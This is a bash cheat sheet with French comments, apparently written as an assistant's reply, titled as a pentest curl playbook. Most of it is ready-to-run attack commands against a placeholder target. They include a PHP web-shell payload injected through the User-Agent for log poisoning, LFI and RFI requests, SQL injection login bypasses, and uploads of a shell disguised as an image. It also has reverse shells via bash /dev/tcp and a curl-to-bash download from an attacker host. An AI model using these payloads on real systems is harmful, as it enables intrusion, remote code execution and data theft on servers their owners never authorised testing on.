```bash
#!/bin/bash
# ============================================
# CURL PLAYBOOK - PENTEST
# ============================================

# ─────────────────────────────────────────
# BASIQUE
# ─────────────────────────────────────────

# GET simple
curl http://TARGET/

# GET silencieux + headers de réponse
curl -si http://TARGET/

# Suivre les redirections
curl -siL http://TARGET/

# Voir seulement les headers
curl -si http://TARGET/ -o /dev/null

# Timeout
curl -s --max-time 5 http://TARGET/

# ─────────────────────────────────────────
# HEADERS
# ─────────────────────────────────────────

# User-Agent custom
curl -s -H "User-Agent: Mozilla/5.0" http://TARGET/

# Injection log poisoning
curl -s -H 'User-Agent: <?php system($_REQUEST["cmd"]); ?>' http://TARGET/

# Header custom
curl -s -H "X-Forwarded-For: 127.0.0.1" http://TARGET/
curl -s -H "Authorization: Bearer TOKEN" http://TARGET/
curl -s -H "Cookie: PHPSESSID=abc123" http://TARGET/

# Referer
curl -s -H "Referer: http://TARGET/admin" http://TARGET/page

# ─────────────────────────────────────────
# POST
# ─────────────────────────────────────────

# POST form
curl -s -X POST http://TARGET/login -d "user=admin&pass=admin"

# POST JSON
curl -s -X POST http://TARGET/api -H "Content-Type: application/json" -d '{"user":"admin","pass":"admin"}'

# POST multipart (upload fichier)
curl -s -X POST http://TARGET/upload -F "file=@shell.php" -F "submit=go"

# POST avec cookie
curl -s -X POST http://TARGET/login -d "user=admin&pass=admin" -b "PHPSESSID=abc123"

# ─────────────────────────────────────────
# AUTHENTIFICATION
# ─────────────────────────────────────────

# Basic auth
curl -s -u admin:password http://TARGET/

# Bearer token
curl -s -H "Authorization: Bearer JWTTOKEN" http://TARGET/api

# Cookie session
curl -s -b "PHPSESSID=abc123; role=admin" http://TARGET/

# Sauvegarder + réutiliser cookies
curl -s -c cookies.txt http://TARGET/login -d "user=admin&pass=admin"
curl -s -b cookies.txt http://TARGET/admin

# ─────────────────────────────────────────
# LFI / INJECTION
# ─────────────────────────────────────────

# LFI basique
curl -s "http://TARGET/index.php?page=../../../../etc/passwd"

# LFI avec filtre PHP base64
curl -s "http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd" | base64 -d

# LFI log poisoning - injection
curl -s -H 'User-Agent: <?php system($_REQUEST["cmd"]); ?>' http://TARGET/

# LFI log poisoning - exécution
curl -s "http://TARGET/index.php?page=/var/log/apache2/access.log&cmd=id"

# RFI
curl -s "http://TARGET/index.php?page=http://KALI_IP/shell.php&cmd=id"

# ─────────────────────────────────────────
# SQLI
# ─────────────────────────────────────────

# Test basique
curl -s "http://TARGET/index.php?id=1'"
curl -s "http://TARGET/index.php?id=1 OR 1=1--"

# SQLi dans POST
curl -s -X POST http://TARGET/login -d "user=admin'--&pass=anything"

# ─────────────────────────────────────────
# FUZZING
# ─────────────────────────────────────────

# Fuzz paramètre GET avec wordlist
while read line; do
  result=$(curl -s "http://TARGET/index.php?page=$line")
  echo "$line: ${#result}"
done < wordlist.txt

# Fuzz avec ffuf (plus rapide)
ffuf -u "http://TARGET/FUZZ" -w /usr/share/wordlists/dirb/common.txt
ffuf -u "http://TARGET/index.php?page=FUZZ" -w lfi_wordlist.txt

# ─────────────────────────────────────────
# UPLOAD
# ─────────────────────────────────────────

# Upload fichier normal
curl -s -X POST http://TARGET/upload.php \
  -F "myFile=@shell.php.png;type=image/png" \
  -F "submit=go"

# Upload avec cookie de session
curl -s -X POST http://TARGET/upload.php \
  -b "PHPSESSID=abc123" \
  -F "myFile=@shell.php.png;type=image/png" \
  -F "submit=go"

# ─────────────────────────────────────────
# REVERSE SHELL VIA CURL
# ─────────────────────────────────────────
# Exécuter un reverseshell
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<IP_ATTACK>/<PORT> 0>&1"' http://<IP>/<RESSOURCE>/<FILE>

# Télécharger et exécuter un script
curl -s "http://TARGET/index.php?page=/var/log/apache2/access.log&cmd=curl+http://KALI_IP/rs.sh|bash"

# URL encodé
curl -s "http://TARGET/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/KALI_IP/4444%200>%261'"

# ─────────────────────────────────────────
# DIVERS
# ─────────────────────────────────────────

# Proxy vers Burp
curl -s http://TARGET/ -x http://127.0.0.1:8080

# Ignorer erreur SSL
curl -sk https://TARGET/

# Sauvegarder la réponse
curl -s http://TARGET/fichier.zip -o fichier.zip

# Verbose complet (debug)
curl -v http://TARGET/

# Afficher seulement le code HTTP
curl -s -o /dev/null -w "%{http_code}" http://TARGET/
```

Sauvegarde-le :
```bash
curl_playbook.sh
```
